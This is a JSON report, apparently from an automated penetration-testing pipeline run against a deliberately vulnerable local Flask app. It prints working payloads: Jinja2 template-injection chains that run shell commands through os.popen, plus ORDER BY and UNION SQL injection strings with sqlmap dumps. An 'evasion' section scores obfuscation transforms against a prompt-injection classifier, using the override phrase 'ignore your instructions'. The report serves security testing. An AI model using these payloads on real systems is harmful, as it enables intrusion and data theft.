@@ -1,0 +1,765 @@
+{
+  "repo": "e2e-postprobe-fixed",
+  "repo_url": "/tmp/test-vuln-hard",
+  "target_url": "http://127.0.0.1:8098",
+  "target_class": "local",
+  "stealth": "direct \u2014 no Tor for local targets (Arti has no loopback route)",
+  "started": "2026-11-10T06:33:04Z",
+  "duration_s": 1053,
+  "strix_run_dir": "/opt/ares/strix/strix_runs/test-vuln-hard_424b",
+  "strix_model": "strix-paid",
+  "strix_seconds": 737,
+  "betterleaks": {
+    "hits": 50,
+    "rc": 1,
+    "leaks": [
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 4866,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 4866,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-api-key",
+        "file": "/repo/app.log",
+        "line": 5559,
+        "match_prefix": "api\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8536,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8537,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8538,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8539,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8540,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8541,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8542,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8543,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8544,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8545,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8546,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8547,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8548,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8549,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8550,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8551,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8552,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8553,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8554,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8555,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8556,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8557,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8558,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8561,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8562,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8564,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8567,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8574,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8575,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8576,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8580,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8581,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8583,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8584,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8586,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 8587,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "jwt",
+        "file": "/repo/app.log",
+        "line": 10637,
+        "match_prefix": "eyJ\u2026"
+      },
+      {
+        "rule": "jwt",
+        "file": "/repo/app.log",
+        "line": 10747,
+        "match_prefix": "eyJ\u2026"
+      },
+      {
+        "rule": "jwt",
+        "file": "/repo/app.log",
+        "line": 10854,
+        "match_prefix": "eyJ\u2026"
+      },
+      {
+        "rule": "generic-api-key",
+        "file": "/repo/app.log",
+        "line": 11287,
+        "match_prefix": "tok\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 11453,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-api-key",
+        "file": "/repo/app.log",
+        "line": 11875,
+        "match_prefix": "tok\u2026"
+      },
+      {
+        "rule": "jwt",
+        "file": "/repo/app.log",
+        "line": 13507,
+        "match_prefix": "eyJ\u2026"
+      },
+      {
+        "rule": "jwt",
+        "file": "/repo/app.log",
+        "line": 13522,
+        "match_prefix": "eyJ\u2026"
+      },
+      {
+        "rule": "generic-api-key",
+        "file": "/repo/app.log",
+        "line": 15576,
+        "match_prefix": "tok\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 121432,
+        "match_prefix": "htt\u2026"
+      },
+      {
+        "rule": "generic-credential-uri",
+        "file": "/repo/app.log",
+        "line": 121432,
+        "match_prefix": "htt\u2026"
+      }
+    ]
+  },
+  "strix_findings": [
+    {
+      "title": "Unauthenticated Jinja2 Server-Side Template Injection to Remote Code Execution in POST /render (tpl)",
+      "severity": "critical",
+      "description": "The `tpl` form field of `POST /render` is passed directly to Flask's `render_template_string`, so the value is compiled by the active Jinja2 environment as template source rather than rendered as data. An unauthenticated attacker can therefore evaluate arbitrary Jinja2 expressions and escalate through reachable Python objects to execute operating-system commands on the server. The module docstring describes the sink as \"Mako SSTI\", but the imported function compiles Jinja2, which is what actually executes.",
+      "poc": "1. Start the application (a private copy of `app.py` was used with its own seeded database, bound to a test port, so the original directory was not modified).\n2. Send a benign baseline request to prove the field is normally reflected as data: POST `tpl=hello`. The response body is `hello`.\n3. Send a template expression as the same field: POST `tpl={{7*7}}`. The response body is `49`.\n4. Send a second, different expression to rule out coincidence or hard-coded reflection: POST `tpl={{7*8}}`. The response body is `56`.\n5. Fingerprint the engine: POST `tpl={{7*'7'}}` returns `7777777` and POST `tpl={{self.__class__.__mro__}}` returns `<class 'jinja2.runtime.TemplateReference'>`, identifying Jinja2. Mako `${7*7}` and ERB `<%= 7*7 %>` are returned literally.\n6. Confirm access to framework globals: POST `tpl={{config}}` returns the fully rendered Flask configuration object.\n7. Reach code execution: POST `tpl={{cycler.__init__.__globals__.os.popen(\"id\").read()}}` returns `uid=1000(pentester) gid=1000(pentester) groups=1000(pentester),27(sudo)`.\n8. Confirm arbitrary command execution beyond identity: POST `tpl={{cycler.__init__.__globals__.os.popen(\"uname -a\").read()}}` returns the host kernel banner, and POST `tpl={{cycler.__init__.__globals__.os.popen(\"cat <path>/marker.txt\").read()}}` returns the contents of a marker file created for the test.\n9. Confirm the chain is not specific to one gadget by repeating with `{{config.__class__.__init__.__globals__[\"os\"].popen(\"echo hi_from_config_gadget; id\").read()}}`, `{{\"\".__class__.__mro__[1].__subclasses__()[167].__init__.__globals__[\"__builtins__\"][\"__import__\"](\"os\").popen(\"id\").read()}}` and `{{lipsum.__globals__[\"os\"].popen(\"id\").read()}}` \u2014 all returned command output.",
+      "target": "/workspace/test-vuln-hard",
+      "endpoint": "/render",
+      "method": "POST",
+      "cvss": 9.8,
+      "finding_class": "dynamic",
+      "source": "vulnerabilities.json"
+    },
+    {
+      "title": "SQL Injection in GET /orders sort parameter (ORDER BY clause)",
+      "severity": "high",
+      "description": "The `sort` query parameter of `GET /orders` is interpolated directly into the SQL `ORDER BY` clause with an f-string instead of being restricted to a fixed set of column names. An unauthenticated attacker can inject arbitrary SQL expressions, including sub-selects, turning the endpoint into a blind SQL-injection oracle over the whole database. The hidden `note` column \u2014 never part of this route's projected columns \u2014 and the database schema were both extracted through it.",
+      "poc": "1. Start the application from a private working copy on a non-conflicting port so the workspace directory is untouched.\n2. Send the benign baseline `GET /orders?sort=id` and record the three-row response as the negative control.\n3. Send `GET /orders?sort=4`. Observe `HTTP 500` and `1st ORDER BY term out of range - should be between 1 and 3`, establishing the injection point and the three-column projection.\n4. Send the boolean-TRUE payload `GET /orders?sort=(CASE WHEN (SELECT substr(note,1,5) FROM orders WHERE id=1)=\"flag{\" THEN id ELSE -id END)`. Observe rows ordered `1,2,3`.\n5. Send the boolean-FALSE control with an identical payload shape but a false predicate (`=\"zzzz!\"`). Observe rows ordered `3,2,1`. The ordering difference between steps 4 and 5 is the extraction oracle.\n6. Run the automated binary-search extractor to recover `note` for every row plus `sqlite_version()`; results include `flag{orderby_ok}`.\n7. Repeat the oracle against `sqlite_master` to confirm schema access from the same injection point.",
+      "target": "/workspace/test-vuln-hard",
+      "endpoint": "/orders",
+      "method": "GET",
+      "cvss": 7.5,
+      "finding_class": "dynamic",
+      "source": "vulnerabilities.json"
+    },
+    {
+      "title": "SQL Injection in POST /orders/by-sku via JSON body sku field",
+      "severity": "high",
+      "description": "The `sku` field of the JSON body accepted by `POST /orders/by-sku` is interpolated into a single-quoted SQL string literal with an f-string instead of being bound as a parameter. An unauthenticated attacker can break out of the literal, append a `UNION SELECT`, and read arbitrary rows and schema metadata. A single request returns every row of the `orders` table \u2014 including the `note` values of rows the caller never asked for \u2014 and the `sqlite_master` DDL.",
+      "poc": "1. Run the application from a private working copy on a non-conflicting port so the workspace directory is untouched.\n2. Send the benign baseline `POST /orders/by-sku` with body `{\"sku\": \"alpha\"}`. Observe exactly one row returned, as intended.\n3. Send the same request with body `{\"sku\": \"zzz' UNION SELECT id,sku,note FROM orders --\"}`. Observe all three rows returned with their `note` values, including `flag{orderby_ok}`.\n4. Send `{\"sku\": \"zzz' UNION SELECT 99,sqlite_version(),(SELECT group_concat(note) FROM orders) --\"}` to confirm arbitrary expressions and aggregation in the injected projection.\n5. Send `{\"sku\": \"zzz' UNION SELECT 1,name,sql FROM sqlite_master --\"}` to retrieve the schema DDL.\n6. Compare step 2 against steps 3-5: the legitimate query was asked for one SKU, and the injected responses disclose the entire table and schema.",
+      "target": "/workspace/test-vuln-hard",
+      "endpoint": "/orders/by-sku",
+      "method": "POST",
+      "cvss": 7.5,
+      "finding_class": "dynamic",
+      "source": "vulnerabilities.json"
+    }
+  ],
+  "endpoints": [
+    "http://127.0.0.1:8098/render",
+    "http://127.0.0.1:8098/orders?sort=1",
+    "http://127.0.0.1:8098/orders/by-sku?a=1"
+  ],
+  "sqlmap": {
+    "url": "http://127.0.0.1:8098/orders?sort=1",
+    "injectable": true,
+    "rc": 0,
+    "dbms": "SQLite",
+    "techniques": [
+      "boolean-based blind"
+    ],
+    "tables": [
+      "orders"
+    ],
+    "dump_rc": 0,
+    "dump_rows": 3,
+    "dumped_table": "orders",
+    "sensitive_exposed": true,
+    "sample": [
+      "| 1  | 3   | alpha | flag{orderby_ok} |",
+      "| 2  | 7   | beta  | nothing          |",
+      "| 3  | 1   | gamma | x                |"
+    ],
+    "columns": "| id | qty | sku   | note             |"
+  },
+  "sqlmap_post": {
+    "url": "http://127.0.0.1:8098/orders/by-sku",
+    "injectable": true,
+    "rc": 0,
+    "method": "POST",
+    "data_template": "{\"sku\": \"1\"}",
+    "dbms": "SQLite",
+    "techniques": [
+      "UNION query",
+      "boolean-based blind"
+    ],
+    "tables": [
+      "orders"
+    ],
+    "dump_rc": 0,
+    "dump_rows": 3,
+    "dumped_table": "orders",
+    "sensitive_exposed": true,
+    "sample": [
+      "| 1  | 3   | alpha | flag{orderby_ok} |",
+      "| 2  | 7   | beta  | nothing          |",
+      "| 3  | 1   | gamma | x                |"
+    ],
+    "columns": "| id | qty | sku   | note             |"
+  },
+  "sstimap": {
+    "url": "http://127.0.0.1:8098/render",
+    "vulnerable": true,
+    "confidence": "high",
+    "engine": "Jinja2",
+    "rce": true,
+    "rc": 0,
+    "post_param": "tpl",
+    "post_data_type": "form",
+    "via": "POST body"
+  },
+  "xsstrike": {
+    "vectors": 0
+  },
+  "nmap": {
+    "host": "127.0.0.1",
+    "port": 8098,
+    "services": [
+      [
+        "unknown",
+        "1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :"
+      ]
+    ],
+    "rc": 0
+  },
+  "ffuf": {
+    "paths": 1,
+    "found": [
+      "http://127.0.0.1:8098/orders"
+    ]
+  },
+  "nuclei": {
+    "hits": 0,
+    "findings": [],
+    "rc": 0
+  },
+  "metasploit": {
+    "server": "Werkzeug/3.0.1 Python/3.12.3",
+    "module": null,
+    "rc": 0,
+    "candidates": [
+      "exploit/multi/http/werkzeug_debug_rce",
+      "exploit/multi/http/werkzeug_debug_rce"
+    ]
+  },
+  "sweep": {
+    "candidates": 14,
+    "sstimap_hits": [],
+    "sstimap_low": [],
+    "xsstrike_hits": []
+  },
+  "clock": {
+    "clock": {
+      "ok": true,
+      "height": 975267,
+      "tip_time": 1794289988,
+      "mediantime": 1794287291,
+      "now_est": 1794292387,
+      "interval": [
+        1794289988,
+        1794292388
+      ],
+      "uncertainty_s": 1200,
+      "elapsed_since_tip_s": 2,
+      "next_block_eta_s": 0,
+      "skew_s": 1,
+      "wall_skew_s": 1,
+      "ref_time": 1794292386.1411574,
+      "ref_spread_s": 1,
+      "chain_lag_s": 2400,
+      "source": "mempool.space",
+      "height_spread": 0,
+      "verified": true,
+      "chain": {
+        "ok": true,
+        "height": 975267,
+        "tip_hash": "00000000000000000000d216f37900961f51185df1da6b6c7d17c7b48fb84251",
+        "headers_checked": 12,
+        "link_ok": true,
+        "pow_ok": true,
+        "bits_ok": true,
+        "mtp11": 1794285850,
+        "mtp_rule_ok": true,
+        "time_bounds_ok": true,
+        "difficulty": 148364561003867.4,
+        "continuity": {
+          "anchor_height": 975261,
+          "anchor_hash": "000000000000000000001025f05ee3da78a23d099047d1721480bfcdc591c297",
+          "bootstrapped": false,
+          "walked": 0,
+          "reorg_depth": null,
+          "rooted": true,
+          "pin": {
+            "height": 974990,
+            "hash": "00000000000000000000060a86c8d28dce411044214051e27c27947ed3ea26c5",
+            "status": "matched",
+            "source": "self-recorded lockdown 2026-11-07",
+            "class": "self_recorded",
+            "rooted_by": {
+              "height": 974985,
+              "class": "buried_multi_source",
+              "source": "3/3 sources agree, buried 6, PoW+linkage verified locally"
+            }
+          },
+          "roots": [
+            {
+              "height": 974990,
+              "class": "self_recorded",
+              "source": "self-recorded lockdown 2026-11-07"
+            },
+            {
+              "height": 974985,
+              "class": "buried_multi_source",
+              "source": "3/3 sources agree, buried 6, PoW+linkage verified locally"
+            }
+          ],
+          "advanced_from": 975261,
+          "verified_against": "000000000000000000001025f05ee3da78a23d099047d1721480bfcdc591c297",
+          "seeded": {
+            "at": 1794081193,
+            "sources": [
+              "mempool.space",
+              "blockstream.info",
+              "blockchain.info"
+            ],
+            "agreeing": 3,
+            "tip_height": 974977,
+            "tip_hash": "000000000000000000003f035792bcf369cd50a07e4bd82e95fca75e88aeded5",
+            "votes": 1,
+            "wallet_depth": 6
+          },
+          "ok": true,
+          "verified_depth": {
+            "count": 10157,
+            "lowest": 965111,
+            "highest": 975267,
+            "span": 10157
+          }
+        },
+        "source": "mempool.space",
+        "errors": [],
+        "rooted": true
+      },
+      "height_mismatch": null,
+      "degraded": false,
+      "freshness_s": 1,
+      "wall_now": 1794292388
+    },
+    "calendar": {
+      "block_height": 975267,
+      "btc_day": 6772,
+      "btc_week": 967,
+      "btc_weekday": 3,
+      "btc_domain": "Query",
+      "is_sabbath": false,
+      "halving_era": 4,
+      "blocks_until_halving": 74733,
+      "block_reward": 3.125,
+      "epoch": {
+        "era": 4,
+        "name": "Fourth Reduction",
+        "reward": 3.125,
+        "alchemy": "Fermentation",
+        "element": "Ether"
+      },
+      "minute_slot": 387,
+      "supply_mined": 95.7629,
+      "timestamp": "2026-11-10T06:33:08.199Z"
+    },
+    "sabbath": false,
+    "domain": "Query",
+    "btc_day": 6772,
+    "halving_era": 4
+  },
+  "injection": {
+    "cmdi": [],
+    "traversal": [],
+    "default_exec": [],
+    "requests": 32
+  },
+  "sabbath_gate": {
+    "enabled": false,
+    "blocked": false
+  },
+  "evidence_dir": "/opt/ares/security_reports/e2e-postprobe-fixed_20261110T063304Z",
+  "evidence_files": [
+    "raw/betterleaks.log",
+    "raw/ffuf.log",
+    "raw/metasploit.log",
+    "raw/nmap.log",
+    "raw/nuclei.log",
+    "raw/sqlmap.log",
+    "raw/sqlmap_post.log",
+    "raw/sstimap.log",
+    "raw/sstimap_post.log",
+    "raw/strix.log",
+    "report.json",
+    "report.md",
+    "sqlmap/127.0.0.1/dump/SQLite_masterdb/orders.csv",
+    "sqlmap/127.0.0.1/log",
+    "sqlmap/127.0.0.1/session.sqlite",
+    "sqlmap/127.0.0.1/target.txt",
+    "sqlmap/results-11102026_0748am.csv",
+    "sqlmap_post/127.0.0.1/dump/SQLite_masterdb/orders.csv",
+    "sqlmap_post/127.0.0.1/log",
+    "sqlmap_post/127.0.0.1/session.sqlite",
+    "sqlmap_post/127.0.0.1/target.txt",
+    "sqlmap_post/results-11102026_0749am.csv"
+  ],
+  "evasion": {
+    "thresholds": {
+      "flag": 0.6,
+      "block": 0.9
+    },
+    "weakest_first": [
+      {
+        "transform": "identity",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "base64",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "base64x2",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "rot13",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "hex_escape",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "unicode_escape",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "zero_width",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "spaced",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "fullwidth",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "leet",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "reversed",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      },
+      {
+        "transform": "mixed",
+        "flag_rate": 1.0,
+        "block_rate": 0.0,
+        "mean_score": 0.6,
+        "max_score": 0.6
+      }
+    ],
+    "control": {
+      "payload": "ignore your instructions",
+      "composite": 1.0,
+      "flagged": true,
+      "ok": true
+    },
+    "overall_flag_rate": 1.0
+  },
+  "memory": {
+    "new": [
+      {
+        "fp": "195b0820e429080f",
+        "title": "Unauthenticated Jinja2 Server-Side Template Injection to Remote Code Execution in POST /render (tpl)"
+      },
+      {
+        "fp": "d65cd2b288aeb07c",
+        "title": "SQL Injection in GET /orders sort parameter (ORDER BY clause)"
+      },
+      {
+        "fp": "04ecb6dd9b3eee01",
+        "title": "SQL Injection in POST /orders/by-sku via JSON body sku field"
+      }
+    ],
+    "persisting": [],
+    "resolved": [],
+    "counts": {
+      "new": 3,
+      "persisting": 0,
+      "resolved": 0,
+      "active": 3,
+      "age_of_oldest_active": null
+    },
+    "run": "2026-11-10T06:33:04Z"
+  },
+  "receipt": {
+    "receipt_id": "a25d9796b55bcbc8efc4f32687a6ffc8750035578e43c9fc4168313102a5a7fc",
+    "path": "/opt/ares/security_receipts/e2e-postprobe-fixed/a25d9796b55bcbc8.json",
+    "merkle_root": "1affc63fce1c3219661e13fc56b60e2f57f735349525b007d4a4ef4a9eddad02",
+    "chain_index": 0,
+    "prev_receipt": null,
+    "artifacts": 20,
+    "diagnostics": 3
+  },
+  "ots": {
+    "skipped": true
+  },
+  "time": {
+    "skipped": true
+  },
+  "anchor": {
+    "skipped": true
+  },
+  "vantage_broadcast_id": 76662,
+  "vantage_response": {
+    "broadcast_id": 76662,
+    "status": "ready"
+  }
+}
